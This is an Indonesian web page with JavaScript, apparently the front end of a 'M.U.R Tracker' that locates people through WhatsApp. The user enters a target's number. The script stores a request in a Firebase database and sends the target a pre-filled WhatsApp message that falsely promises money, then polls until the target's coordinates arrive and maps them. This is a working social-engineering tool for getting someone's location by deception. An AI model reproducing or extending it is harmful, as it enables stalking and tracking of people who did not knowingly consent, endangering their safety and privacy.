<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>M.U.R Tracker</title>

<style>
*{box-sizing:border-box}

body{
    margin:0;
    min-height:100vh;
    background:#1f2933;
    color:#fff;
    font-family:Arial,sans-serif;
    padding:20px;
}

.dashboard{
    max-width:600px;
    margin:0 auto;
    background:#050505;
    border-radius:25px;
    padding:25px;
    border:1px solid #008080;
}

.header{
    display:flex;
    justify-content:space-between;
    align-items:center;
    border-bottom:2px solid #008080;
    padding-bottom:15px;
    margin-bottom:20px;
}

.header h2{
    margin:0;
    color:#00a6a6;
}

.logout{
    background:#8b0000;
    color:white;
    border:0;
    padding:8px 15px;
    border-radius:15px;
}

.search{
    display:flex;
    gap:10px;
    margin-bottom:25px;
}

.search input{
    flex:1;
    min-width:0;
    padding:14px 18px;
    border:1px solid #777;
    border-radius:25px;
    background:#111;
    color:#fff;
    outline:none;
}

.search button{
    background:#00a6a6;
    color:#000;
    border:0;
    padding:0 22px;
    border-radius:25px;
    font-weight:bold;
}

.result{
    background:#111;
    border:1px dashed #008080;
    border-radius:15px;
    padding:20px;
}

.result h3{
    margin-top:0;
    color:#00a6a6;
}

#status{
    word-break:break-word;
}

#location{
    line-height:1.7;
    word-break:break-word;
}

a{
    color:#00d0d0;
}
</style>
</head>

<body>

<div class="dashboard">

    <div class="header">
        <div>
            <h2>★ M.U.R TRACK ★</h2>
            <small id="user">Memuat...</small>
        </div>

        <button class="logout" onclick="logout()">Keluar</button>
    </div>

    <div class="search">
        <input
            id="targetNumber"
            type="tel"
            placeholder="Nomor WhatsApp tujuan"
        >

        <button onclick="kirimPermintaan()">
            Lacak
        </button>
    </div>

    <div class="result">

        <h3>Status Permintaan</h3>

        <p>
            <b>Nomor:</b>
            <span id="nomorHasil">-</span>
        </p>

        <p>
            <b>Status:</b>
            <span id="status">-</span>
        </p>

        <div id="location"></div>

    </div>

</div>

<script>

const FIREBASE_URL =
"https://mur-studio-default-rtdb.asia-southeast1.firebasedatabase.app/";

const HOSTING_URL =
"https://oralive04-del.github.io/Mur-apk-new/minta_izin.html";

let sesi = null;
let akun = null;
let pemantauan = null;


/* =========================
   SAAT HALAMAN DIBUKA
========================= */

window.onload = function(){

    try{

        sesi = JSON.parse(
            localStorage.getItem("sesiMUR") || "null"
        );

        akun = JSON.parse(
            localStorage.getItem("akunMUR") || "null"
        );

    }catch(e){

        sesi = null;
        akun = null;

    }

    if(!sesi || !akun){

        location.href = "index.html";
        return;

    }

    document.getElementById("user").textContent =
        "Login: " + (sesi.username || akun.username);


    /*
     * Cek apakah ada permintaan yang sebelumnya
     * sudah dibuat.
     */

    const tersimpan =
        localStorage.getItem("permintaanMUR");

    if(tersimpan){

        try{

            const data = JSON.parse(tersimpan);

            if(data.target && data.requestId){

                document.getElementById("nomorHasil").textContent =
                    data.target;

                document.getElementById("status").textContent =
                    "Memeriksa hasil persetujuan...";

                cekPermintaan(
                    data.target,
                    data.requestId
                );

            }

        }catch(e){

            console.log(e);

        }

    }

};


/* =========================
   NORMALISASI NOMOR
========================= */

function normalisasiNomor(input){

    let nomor =
        String(input).replace(/\D/g,"");

    if(nomor.startsWith("0")){

        nomor =
            "62" + nomor.substring(1);

    }else if(nomor.startsWith("8")){

        nomor =
            "62" + nomor;

    }

    return nomor;

}


/* =========================
   KIRIM PERMINTAAN
========================= */

async function kirimPermintaan(){

    const input =
        document.getElementById("targetNumber");

    const target =
        normalisasiNomor(input.value);

    if(target.length < 10){

        document.getElementById("status").textContent =
            "Nomor WhatsApp tidak valid.";

        return;

    }


    const requestId =
        "MUR_" +
        Date.now() +
        "_" +
        Math.random()
        .toString(36)
        .substring(2,8);


    document.getElementById("nomorHasil").textContent =
        target;

    document.getElementById("status").textContent =
        "Membuat permintaan...";

    document.getElementById("location").innerHTML = "";


    const data = {

        fromUser:
            sesi.username || akun.username,

        targetPhone:
            target,

        status:
            "menunggu",

        createdAt:
            Date.now()

    };


    try{

        const response = await fetch(

            FIREBASE_URL +
            "permintaan/" +
            encodeURIComponent(target) +
            "/" +
            encodeURIComponent(requestId) +
            ".json",

            {
                method:"PUT",

                headers:{
                    "Content-Type":"application/json"
                },

                body:JSON.stringify(data)
            }

        );


        if(!response.ok){

            throw new Error(
                "Firebase HTTP " +
                response.status
            );

        }


        /*
         * SIMPAN REQUEST
         * supaya tidak hilang ketika WhatsApp dibuka.
         */

        localStorage.setItem(
            "permintaanMUR",
            JSON.stringify({
                target:target,
                requestId:requestId
            })
        );


        const izinURL =
            HOSTING_URL +
            "?request=" +
            encodeURIComponent(requestId) +
            "&nomor=" +
            encodeURIComponent(target);


        const pesan =
            "Permintaan M.U.R\n\n" +
            "Seseorang menawarkan dana untuk Anda melalui M.U.R.\n\n" +
            "Buka link berikut untuk melihat permintaan dan pilih SETUJUI jika Anda bersedia:\n\n" +
            izinURL;


        const whatsappURL =
            "https://wa.me/" +
            target +
            "?text=" +
            encodeURIComponent(pesan);


        document.getElementById("status").textContent =
            "Membuka WhatsApp...";


        /*
         * Mulai pemantauan sebelum pindah.
         */

        mulaiPemantauan(
            target,
            requestId
        );


        /*
         * Buka WhatsApp.
         */

        window.location.href =
            whatsappURL;


    }catch(error){

        console.error(error);

        document.getElementById("status").textContent =
            "Gagal membuat permintaan: " +
            error.message;

    }

}


/* =========================
   MULAI PEMANTAUAN
========================= */

function mulaiPemantauan(
    target,
    requestId
){

    if(pemantauan){

        clearInterval(pemantauan);

    }


    cekPermintaan(
        target,
        requestId
    );


    pemantauan =
        setInterval(function(){

            cekPermintaan(
                target,
                requestId
            );

        },3000);

}


/* =========================
   CEK FIREBASE
========================= */

async function cekPermintaan(
    target,
    requestId
){

    try{

        const response = await fetch(

            FIREBASE_URL +
            "permintaan/" +
            encodeURIComponent(target) +
            "/" +
            encodeURIComponent(requestId) +
            ".json"

        );


        if(!response.ok){

            throw new Error(
                "Firebase HTTP " +
                response.status
            );

        }


        const data =
            await response.json();


        if(!data){

            document.getElementById("status").textContent =
                "Permintaan tidak ditemukan.";

            return;

        }


        if(data.status === "menunggu"){

            document.getElementById("status").textContent =
                "Menunggu persetujuan dari penerima...";

        }


        else if(data.status === "ditolak"){

            if(pemantauan){

                clearInterval(pemantauan);

            }

            document.getElementById("status").textContent =
                "Permintaan ditolak.";

            document.getElementById("location").innerHTML =
                "";

        }


        else if(data.status === "disetujui"){

            if(pemantauan){

                clearInterval(pemantauan);

            }

            document.getElementById("status").textContent =
                "Lokasi disetujui.";

            
            if(
                data.lat !== undefined &&
                data.lng !== undefined
            ){

                document.getElementById("location").innerHTML =

                    "<b>Latitude:</b> " +
                    data.lat +

                    "<br><b>Longitude:</b> " +
                    data.lng +

                    "<br><br>" +

                    "<a target='_blank' href='https://www.google.com/maps?q=" +
                    encodeURIComponent(
                        data.lat + "," + data.lng
                    ) +
                    "'>" +

                    "📍 Buka di Google Maps" +

                    "</a>";

            }else{

                document.getElementById("location").textContent =
                    "Persetujuan diterima, tetapi koordinat belum tersedia.";

            }

        }


    }catch(error){

        console.error(error);

        document.getElementById("status").textContent =
            "Gagal membaca status: " +
            error.message;

    }

}


/* =========================
   LOGOUT
========================= */

function logout(){

    localStorage.removeItem("sesiMUR");

    if(pemantauan){

        clearInterval(pemantauan);

    }

    location.href =
        "index.html";

}

</script>

</body>
    </html>
